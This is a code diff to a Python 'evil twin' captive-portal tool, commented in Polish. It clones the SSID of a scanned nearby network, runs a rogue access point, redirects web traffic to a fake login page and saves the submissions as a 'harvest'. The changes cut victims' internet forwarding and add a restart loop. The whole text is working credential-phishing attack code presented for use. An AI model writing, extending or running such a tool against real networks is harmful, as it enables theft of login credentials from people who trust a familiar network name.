@@ -270,11 +270,12 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(b"Login received. You can now access the internet.")
+        self.wfile.write(b"Login received.")
     
     def log_message(self, format, *args):
         # Wyłącz domyślne logowanie HTTP
         pass
+
 
 def setup_ap():
     """Konfiguracja i uruchomienie Access Point"""
@@ -346,9 +347,6 @@ log-dhcp
         subprocess.run(['iptables', '-t', 'nat', '-F'])
         subprocess.run(['iptables', '-F'])
         subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', AP_INTERFACE, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', f'{AP_IP}:80'])
-        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', INTERNET_INTERFACE, '-j', 'MASQUERADE'])
-        subprocess.run(['iptables', '-A', 'FORWARD', '-i', AP_INTERFACE, '-o', INTERNET_INTERFACE, '-j', 'ACCEPT'])
-        subprocess.run(['iptables', '-A', 'FORWARD', '-i', INTERNET_INTERFACE, '-o', AP_INTERFACE, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'])
         
         logging.info(f"Access Point '{AP_SSID}' started on {AP_IP}")
         logging.info(f"DHCP range: {DHCP_RANGE_START} - {DHCP_RANGE_END}")
@@ -393,45 +391,37 @@ def cleanup():
     
     logging.info("Cleanup completed")
 
-def main():
-    """Główna funkcja"""
-    logging.info(color_text("Portal Wizard", COLOR_HEADER))
-    logging.info("Starting Captive Portal System")
-    
-    # Sprawdź uprawnienia
-    if os.geteuid() != 0:
-        logging.error("This script must be run as root!")
-        sys.exit(1)
-    
-    # Sprawdź dostępność wymaganych narzędzi
-    required_tools = ['hostapd', 'dnsmasq', 'iptables', 'ip', 'ethtool', 'iw']
-    for tool in required_tools:
-        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
-            logging.error(f"Required tool '{tool}' not found!")
-            sys.exit(1)
+def run_portal_session():
+    """Uruchomienie pojedynczej sesji portalu"""
+    SUBMISSION_EVENT.clear()
+    with SUBMISSION_LOCK:
+        global LAST_SUBMISSION_IP
+        LAST_SUBMISSION_IP = None
     
     # Wybór interfejsu AP
     interfaces = list_network_interfaces()
     globals()["AP_INTERFACE"] = select_interface(interfaces)
 
+    subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'up'], stderr=subprocess.DEVNULL)
+    input(f"Press Enter to scan networks on {AP_INTERFACE}...")
+
     # Nazwa sieci po skanowaniu
     globals()["AP_SSID"] = select_network_ssid(AP_INTERFACE)
+
+    input(f"Press Enter to start captive portal '{AP_SSID}'...")
 
     capture_filename = sanitize_filename(AP_SSID)
     globals()["CAPTURE_FILE_PATH"] = os.path.join(os.path.dirname(__file__), capture_filename)
     logging.info("Capturing portal submissions in: %s", CAPTURE_FILE_PATH)
-
-    # Rejestruj cleanup przy wyjściu
-    import atexit
-    atexit.register(cleanup)
     
     http_server = None
+    restart_requested = False
     try:
         # Uruchom Access Point
         hostapd_proc, dnsmasq_proc = setup_ap()
         if not hostapd_proc or not dnsmasq_proc:
             logging.error("Failed to start Access Point")
-            sys.exit(1)
+            return False
         
         # Poczekaj chwilę na uruchomienie AP
         time.sleep(5)
@@ -456,22 +446,23 @@ def main():
                 with SUBMISSION_LOCK:
                     SUBMISSION_EVENT.clear()
 
-                logging.info(color_text("The harvest complete!", COLOR_SUCCESS))
+                logging.info(color_text("harvest complete!", COLOR_SUCCESS))
                 while True:
-                    exit_choice = input("Exit script? (Y/N): ").strip().lower()
-                    if exit_choice in {"y", "n"}:
+                    exit_choice = input("Exit script (E) or restart (R): ").strip().lower()
+                    if exit_choice in {"e", "exit"}:
                         break
-                    logging.warning("Please enter Y or N.")
+                    if exit_choice in {"r", "restart"}:
+                        restart_requested = True
+                        break
+                    logging.warning("Please enter E or R.")
 
-                if exit_choice == "y":
-                    break
+                break
 
             # Sprawdź czy procesy działają
             for i, proc in enumerate(processes):
                 if proc and proc.poll() is not None:
                     logging.error(f"Process {i} died!")
-                    cleanup()
-                    sys.exit(1)
+                    return False
                     
     except KeyboardInterrupt:
         logging.info(color_text("Shutting down...", COLOR_STOP))
@@ -482,6 +473,33 @@ def main():
             http_server.shutdown()
             http_server.server_close()
         cleanup()
+
+    return restart_requested
+
+
+def main():
+    """Główna funkcja"""
+    logging.info(color_text("Portal Wizard", COLOR_HEADER))
+    logging.info("Starting Captive Portal System")
+    
+    # Sprawdź uprawnienia
+    if os.geteuid() != 0:
+        logging.error("This script must be run as root!")
+        sys.exit(1)
+    
+    # Sprawdź dostępność wymaganych narzędzi
+    required_tools = ['hostapd', 'dnsmasq', 'iptables', 'ip', 'ethtool', 'iw']
+    for tool in required_tools:
+        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
+            logging.error(f"Required tool '{tool}' not found!")
+            sys.exit(1)
+
+    while True:
+        restart = run_portal_session()
+        if not restart:
+            break
+        logging.info(color_text("Restarting portal wizard...\n", COLOR_HEADER))
+
 
 if __name__ == "__main__":
     main()
